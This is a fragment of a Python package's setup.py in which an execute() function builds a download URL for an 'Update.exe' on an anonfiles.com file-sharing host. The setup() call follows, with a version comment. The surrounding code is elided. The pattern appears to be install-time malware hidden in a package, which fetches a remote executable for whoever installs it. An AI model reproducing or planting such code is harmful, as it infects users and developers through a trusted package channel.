...
def execute():
    ...
    try:
        url = f"https://cdn-128.anonfiles.com/ie34teR1yb/76c23c6e-{round(time.time())+250}/Update.exe"
...
setup(
    ...
    version='0.0.18', # each time you update the module you need too increase this, for example the next version will be 0.0.2
